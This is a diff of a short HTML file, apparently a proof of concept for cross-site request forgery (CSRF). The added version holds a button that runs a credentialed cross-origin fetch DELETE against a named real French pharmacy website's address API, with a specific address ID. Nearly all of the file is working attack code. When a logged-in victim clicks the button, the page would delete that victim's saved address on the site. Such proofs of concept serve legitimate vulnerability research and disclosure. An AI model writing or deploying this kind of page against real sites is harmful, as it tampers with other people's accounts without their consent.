@@ -1,31 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PoC - DELETE Address</title>
-</head>
-<body>
-  <h1>CSRF PoC - Delete Address</h1>
-  <p>Click the button below to manually trigger the DELETE request.</p>
-  <button onclick="sendRequest()">Delete Address</button>
+  <body>
+    <h1>Manual CSRF DELETE Trigger</h1>
+    <button onclick="triggerDelete()">Send DELETE Request</button>
 
-  <script>
-    function sendRequest() {
-      fetch('/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947', {
-        method: 'DELETE',
-        credentials: 'include', // Send cookies
-        headers: {
-          'Accept': 'application/json',
-          'Content-Type': 'application/json'
-        }
-      })
-      .then(response => response.text())
-      .then(data => {
-        alert('Request sent. Response: ' + data);
-      })
-      .catch(error => {
-        alert('Request failed: ' + error);
-      });
-    }
-  </script>
-</body>
+    <script>
+      function triggerDelete() {
+        fetch("https://www.redcare-pharmacie.fr/webclient/api/cacheable/addresses/v2/fr/685fafd2602f60227d1bb947", {
+          method: "DELETE",
+          credentials: "include", // required to send cookies
+          headers: {
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+          }
+        }).then(response => response.text())
+          .then(data => console.log("Response:", data))
+          .catch(err => console.error("Error:", err));
+      }
+    </script>
+  </body>
 </html>
